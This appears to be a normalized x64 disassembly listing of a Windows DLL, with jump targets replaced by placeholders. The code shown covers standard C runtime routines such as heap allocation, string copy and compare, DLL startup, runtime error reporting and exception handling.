mov [ rax ] 0xc
mov rcx [ rw-data ]
mov eax 0x1
test rbx rbx
cmove rbx rax
mov r8 rdi
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
call sub_18001e6e4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_18001e69c
mov [ rbx ] eax
mov rcx rbx
call sub_18001e7ec
test eax eax
je r-xdata
call sub_18001e6e4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_18001e69c
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
sub_18001db70
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x18 ] 0x0
test rdx rdx
jne r-xdata
movups xmm0 [ rdx ]
movdqu [ rcx ] xmm0
call sub_18001ec0c
mov [ rbx + 0x10 ] rax
mov rdx [ rax + 0xc0 ]
mov [ rbx ] rdx
mov rcx [ rax + 0xb8 ]
mov [ rbx + 0x8 ] rcx
cmp rdx [ rw-data ]
je r-xdata
mov rax [ rw-data ]
cmp [ rbx + 0x8 ] rax
je r-xdata
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
mov rax [ rbx + 0x10 ]
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_180023ccc
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
or [ rax + 0xc8 ] 0x2
mov [ rbx + 0x18 ] 0x1
jmp r-xdata
call sub_1800233fc
mov [ rbx + 0x8 ] rax
sub_18001dc14
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_18001e6e4
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bx
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bx
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bx
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
movzx eax [ r10 ]
mov [ r11 + r10 ] ax
add r10 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ r10 + r11 ]
mov [ r11 ] ax
add r11 0x2
test ax ax
je r-xdata
mov [ rcx ] bx
call sub_18001e6e4
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx * 2 - 0x2 ] bx
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_1800207e0
mov eax ebx
sub_18001dce4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
mov rbp rsp
sub rsp 0x50
xor ebx ebx
mov r12 r8
mov r13 rcx
mov rsi rdx
lea rcx [ rbp - 0x28 ]
lea r8d [ rbx + 0x28 ]
xor edx edx
mov rdi r9
mov [ rbp - 0x30 ] rbx
call sub_18001c9f0
test rdi rdi
jne r-xdata
test r12 r12
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
or eax 0xffffffff
jmp r-xdata
mov [ rbp - 0x18 ] 0x42
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] rsi
cmp r12 0x3fffffff
jbe r-xdata
test rsi rsi
je r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
lea eax [ r12 + r12 ]
mov [ rbp - 0x28 ] eax
mov [ rbp - 0x28 ] 0x7fffffff
jmp r-xdata
test eax eax
js r-xdata
mov r9 [ rbp + 0x48 ]
mov r8 [ rbp + 0x40 ]
lea rcx [ rbp - 0x30 ]
mov rdx rdi
call r13
mov edi eax
test rsi rsi
je r-xdata
cmp [ rbp - 0x28 ] ebx
mov [ rsi + r12 * 2 - 0x2 ] bx
setge bl
lea eax [ rbx - 0x2 ]
dec [ rbp - 0x28 ]
js r-xdata
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_180020df4
cmp eax 0xffffffff
je r-xdata
mov rax [ rbp - 0x30 ]
mov [ rax ] bl
mov rax [ rbp - 0x30 ]
inc rax
mov [ rbp - 0x30 ] rax
jmp r-xdata
mov rax [ rbp - 0x30 ]
dec [ rbp - 0x28 ]
js r-xdata
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_180020df4
cmp eax 0xffffffff
je r-xdata
mov [ rax ] bl
jmp r-xdata
mov eax edi
jmp r-xdata
sub_18001de00
sub rsp 0x38
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r9
mov r9 r8
mov r8 rdx
mov rdx rcx
lea rcx [ sub_180021020 ]
call sub_18001dce4
or ecx 0xffffffff
test eax eax
cmovs eax ecx
add rsp 0x38
retn
sub_18001de38
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
xor edi edi
mov rbx rcx
test r8 r8
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
test rcx rcx
je r-xdata
test rdx rdx
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r9
mov r9 r8
mov r8 rdx
mov rdx rcx
lea rcx [ sub_180023e38 ]
call sub_18001dce4
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ rbx ] di
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
call sub_18001e6e4
mov [ rax ] 0x22
jmp r-xdata
call sub_1800207e0
or eax 0xffffffff
sub_18001ded0
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_18001df98
mov [ rsp + 0x18 ] r8
push rbx
sub rsp 0x20
mov rbx r8
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
call sub_18001e76c
test eax eax
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_18001eda4
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp edx 0x3
jne r-xdata
call sub_18001ea9c
mov edx 0x2c8
mov ecx 0x1
call sub_180020880
mov rbx rax
test rax rax
je r-xdata
dec eax
mov [ rw-data ] eax
cmp [ rw-data ] edx
jne r-xdata
call sub_1800251c8
call [ GetCommandLineA@IAT ]
mov [ rw-data ] rax
call sub_1800250d4
mov [ rw-data ] rax
call sub_180024994
test eax eax
jns r-xdata
call sub_18001e7c4
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov eax 0x1
xor ecx ecx
call sub_18001ed64
mov rdx rax
mov ecx [ rw-data ]
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
test rbx rbx
jne r-xdata
call sub_180020dbc
call sub_180024fdc
test eax eax
js r-xdata
call sub_18001eaa8
jmp r-xdata
call sub_18001c80c
jmp r-xdata
xor edx edx
call sub_18001ead0
call [ GetCurrentThreadId@IAT ]
mov [ rbx ] eax
or [ rbx + 0x8 ] 0xffffffffffffffff
jmp r-xdata
test rbx rbx
jne r-xdata
call sub_180024c68
call sub_18001eaa8
call sub_18001e7c4
nop
call sub_180024c68
jmp r-xdata
call sub_180024cdc
test eax eax
js r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
xor ecx ecx
call sub_180020b70
test eax eax
jne r-xdata
call sub_18001eaa8
jmp r-xdata
inc [ rw-data ]
jmp r-xdata
sub_18001e0ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov rsi r8
mov ebx edx
mov r12 rcx
mov eax 0x1
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov r9 [ r--data ]
test r9 r9
je r-xdata
cmp edx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
call r9
mov [ rsp + 0x20 ] eax
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_18001bf10
mov edi eax
mov [ rsp + 0x20 ] eax
cmp ebx 0x1
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
xor eax eax
jmp r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_18001df98
mov [ rsp + 0x20 ] eax
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
test eax eax
jne r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_18001df98
neg eax
sbb ecx ecx
and ecx edi
mov edi ecx
mov [ rsp + 0x20 ] ecx
je r-xdata
cmp ebx 0x3
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call sub_18001bf10
mov r8 rsi
xor edx edx
mov rcx r12
call sub_18001df98
mov r11 [ r--data ]
test r11 r11
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ r--data ]
test rax rax
je r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call r11
mov r8 rsi
mov edx ebx
mov rcx r12
call rax
mov edi eax
mov [ rsp + 0x20 ] eax
_start
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov ebx edx
mov rsi rcx
cmp edx 0x1
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_18001e0ec
call sub_180025238
sub_18001e248
push rbx
sub rsp 0x20
test rcx rcx
je r-xdata
call sub_18001e6e4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
mov r9 rcx
sub r9 r8
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] dl
call sub_18001e6e4
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ r9 + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_1800207e0
mov eax ebx
sub_18001e2c0
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_18001e368
sub rsp 0x28
call sub_18002530c
test rax rax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_18002531c
mov ecx 0x3
call sub_180020db0
int3
mov r8d 0x1
mov edx 0x40000015
lea ecx [ r8 + 0x2 ]
call sub_1800205f0
sub_18001e3c4
lea r8 [ r--data ]
xor eax eax
mov rdx r8
cdqe
add rax rax
mov rax [ r8 + rax * 8 + 0x8 ]
retn
inc eax
add rdx 0x10
cmp eax 0x16
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
xor eax eax
retn
sub_18001e3f0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x250
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x240 ] rax
mov edi ecx
call sub_18001e3c4
xor esi esi
mov rbx rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x240 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x250 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
lea ecx [ rsi + 0x3 ]
call sub_180025758
cmp eax 0x1
je r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov rdi rax
test rax rax
je r-xdata
lea ecx [ rsi + 0x3 ]
call sub_180025758
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov edx esi
lea r8 [ rsp + 0x40 ]
lea rbp [ rw-data ]
mov r12d 0x314
lea r8 [ r--data ]
mov rcx rbp
mov edx r12d
call sub_18001d6cc
xor ecx ecx
test eax eax
jne r-xdata
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x233 ] sil
call sub_18001e2c0
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
mov rcx rdi
mov r8 rax
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
inc edx
inc r8
add rbx 0x2
cmp edx 0x1f4
jb r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] rsi
call sub_18002073c
int3
lea r13 [ rw-data ]
mov r8d 0x104
mov [ rw-data ] si
mov rdx r13
call [ GetModuleFileNameW@IAT ]
lea edi [ r12 - 0x19 ]
test eax eax
jne r-xdata
mov cl [ rbx ]
mov [ r8 ] cl
cmp [ rbx ] si
je r-xdata
mov rcx r13
call sub_180021b14
inc rax
cmp rax 0x3c
jbe r-xdata
lea r8 [ r--data ]
mov edx edi
mov rcx r13
call sub_18001d6cc
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r12
mov rcx rbp
call sub_18001d644
test eax eax
jne r-xdata
mov rcx r13
call sub_180021b14
lea r8 [ r--data ]
mov r9d 0x3
lea rcx [ rbp + rax * 2 - 0x44 ]
mov rax rcx
sub rax r13
sar rax 0x1
sub rdi rax
mov rdx rdi
call sub_18001dc14
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18002073c
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18002073c
int3
mov r8 rbx
mov rdx r12
mov rcx rbp
call sub_18001d644
test eax eax
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18002073c
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18002073c
int3
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rbp
call sub_180025550
jmp r-xdata
sub_18001e650
sub rsp 0x28
mov ecx 0x3
call sub_180025758
cmp eax 0x1
je r-xdata
mov ecx 0xfc
call sub_18001e3f0
mov ecx 0xff
call sub_18001e3f0
mov ecx 0x3
call sub_180025758
test eax eax
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_18001e69c
lea r9 [ rw-data ]
xor eax eax
mov rdx r9
lea r8d [ rax + 0x8 ]
cdqe
mov eax [ r9 + rax * 8 + 0x4 ]
retn
inc eax
add rdx r8
cmp eax 0x2d
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
cmp ecx 0xe
cmovbe eax r8d
retn
mov eax 0xd
retn
sub_18001e724
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18001eb88
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
mov ecx ebx
call sub_18001e69c
mov [ r10 ] eax
add rsp 0x20
pop rbx
retn
lea r10 [ rax + 0x10 ]
mov [ rax ] ebx
call sub_18001eb88
lea r10 [ rw-data ]
test rax rax
je r-xdata
sub_18001e76c
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
mov [ rsp + 0x30 ] 0x2
call [ HeapCreate@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x28
retn
call [ GetVersion@IAT ]
cmp al 0x6
jae r-xdata
mov eax 0x1
mov rcx [ rw-data ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
call [ HeapSetInformation@IAT ]
sub_18001e7ec
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
xor eax eax
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18001e820
push rbx
sub rsp 0x30
mov rbx rcx
mov ecx 0xe
call sub_1800259a4
nop
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx 0xe
call sub_1800258a4
add rsp 0x30
pop rbx
retn
mov rcx [ rw-data ]
lea rdx [ rw-data ]
mov rcx [ rbx + 0x8 ]
call sub_18001c80c
and [ rbx + 0x8 ] 0x0
cmp [ rcx ] rax
jne r-xdata
mov rdx rcx
jmp r-xdata
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
call sub_18001c80c
jmp r-xdata
mov [ rsp + 0x20 ] rcx
test rcx rcx
je r-xdata
sub_18001e8a0
sub rdx rcx
mov r9 rdx
test cl 0x7
je r-xdata
mov r11 0x8101010101010100
mov al [ rcx ]
mov dl [ rcx + r9 ]
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
inc rcx
test al al
je r-xdata
mov r10 0x7efefefefefefeff
add r10 rdx
xor rax 0xffffffffffffffff
add rcx 0x8
xor rax r10
test r11 rax
je r-xdata
xor eax eax
retn
test rcx 0x7
jne r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
jmp r-xdata
nop
test dl dl
je r-xdata
xor eax eax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_18001e950
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
movsxd rax [ rbx + 0x18 ]
mov edi [ rbx + 0x14 ]
add rax [ rsi + 0x8 ]
jne r-xdata
call sub_1800203b8
xor ecx ecx
test edi edi
je r-xdata
call sub_1800203b8
or eax 0xffffffff
mov r9 [ rsi + 0x8 ]
movsxd r8 [ rbx + 0x18 ]
lea rdx [ r9 + r8 ]
test ecx ecx
je r-xdata
inc ecx
add rdx 0x8
cmp ecx edi
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rdx [ r8 + rax * 8 ]
mov eax [ rdx + r9 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r9
cmp rbp rax
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18001ea18
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi r9d
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_18001cadc
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
cmp edi [ rax + rcx + 0x4 ]
jle r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rax + rcx + 0x4 ] edi
sub_18001ead0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx + 0xa0 ] rax
and [ rcx + 0x10 ] 0x0
mov [ rcx + 0x1c ] 0x1
mov [ rcx + 0xc8 ] 0x1
mov [ rcx + 0x174 ] 0x43
mov [ rcx + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ rcx + 0xb8 ] rax
mov ecx 0xd
call sub_1800259a4
nop
mov rax [ rbx + 0xb8 ]
[ rax ]
mov ecx 0xd
call sub_1800258a4
mov ecx 0xc
call sub_1800259a4
nop
mov [ rbx + 0xc0 ] rdi
test rdi rdi
jne r-xdata
mov rcx [ rbx + 0xc0 ]
call sub_1800239c8
nop
mov ecx 0xc
call sub_1800258a4
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov [ rbx + 0xc0 ] rax
sub_18001eb88
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2c8
call sub_180020880
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_18001c80c
xor ebx ebx
xor edx edx
call sub_18001ead0
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_18001ec30
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0xa0 ]
lea rax [ r--data ]
cmp rcx rax
je r-xdata
call sub_18001c80c
mov edi 0xd
mov ecx edi
call sub_1800259a4
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_18001c80c
mov ecx edi
call sub_1800258a4
mov ecx 0xc
call sub_1800259a4
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ]
jne r-xdata
mov ecx 0xc
call sub_1800258a4
mov rcx rbx
call sub_18001c80c
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_180023a54
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_18001c80c
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_180023af8
nop
sub_18001ed64
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x20
pop rbx
retn
test rbx rbx
jne r-xdata
xor edx edx
call [ FlsSetValue@IAT ]
mov rcx rbx
call sub_18001ec30
call [ FlsGetValue@IAT ]
mov ecx [ rw-data ]
mov rbx rax
sub_18001eda4
push rbx
sub rsp 0x20
call sub_180020abc
call sub_180025798
test eax eax
je r-xdata
call sub_18001eaa8
xor eax eax
lea rcx [ sub_18001ec30 ]
call [ FlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
mov edx 0x2c8
mov ecx 0x1
call sub_180020880
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
xor edx edx
mov rcx rbx
call sub_18001ead0
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18001ee38
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18001c40c
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_18001ee74
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov esi [ rcx + 0x4 ]
xor ebx ebx
mov r12 r8
mov rbp rdx
mov rdi rcx
test esi esi
je r-xdata
mov r11 rbx
movsxd rsi esi
call sub_18001cbc8
lea r11 [ rsi + rax ]
jmp r-xdata
mov eax 0x1
test esi esi
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
movsxd rsi [ rdi + 0x4 ]
call sub_18001cbc8
lea r11 [ rsi + rax ]
jmp r-xdata
test esi esi
je r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov rsi rbx
call sub_18001cbc8
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
mov al 0x2
test [ rbp ] al
je r-xdata
cmp [ rdi + 0x4 ] ebx
je r-xdata
call sub_18001cbe0
mov r11 rax
movsxd rax [ rbp + 0x4 ]
add r11 rax
cmp rsi r11
je r-xdata
test [ r12 ] 0x1
je r-xdata
test [ rdi ] 0x8
je r-xdata
mov rsi rbx
call sub_18001cbc8
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
test [ r12 ] 0x4
je r-xdata
test [ rdi ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_18001cbe0
lea rcx [ rsi + 0x10 ]
mov r11 rax
movsxd rax [ rbp + 0x4 ]
lea rdx [ r11 + rax + 0x10 ]
call sub_18001e8a0
test eax eax
je r-xdata
test [ r12 ] al
je r-xdata
test [ rdi ] 0x4
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov ebx 0x1
test [ rdi ] al
je r-xdata
sub_18001ef98
sub rsp 0x28
mov rax [ rcx ]
cmp [ rax ] 0xe0434352
je r-xdata
call sub_18001ec0c
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp [ rax ] 0xe0434f4d
je r-xdata
xor eax eax
add rsp 0x28
retn
call sub_18001ec0c
dec [ rax + 0x100 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
call sub_18001ec0c
and [ rax + 0x100 ] 0x0
call sub_180020394
sub_18001efec
mov rax rsp
mov [ rax + 0x20 ] r9d
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r13d r9d
mov rsi r8
mov r15 rdx
mov r14 rcx
call sub_18001e9e4
mov edi eax
call sub_18001cbc8
mov [ rsp + 0x28 ] rax
call sub_18001ec0c
inc [ rax + 0x100 ]
call sub_18001ec0c
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp edi r13d
jle r-xdata
cmp edi 0xffffffff
je r-xdata
call sub_18001ec0c
dec [ rax + 0x100 ]
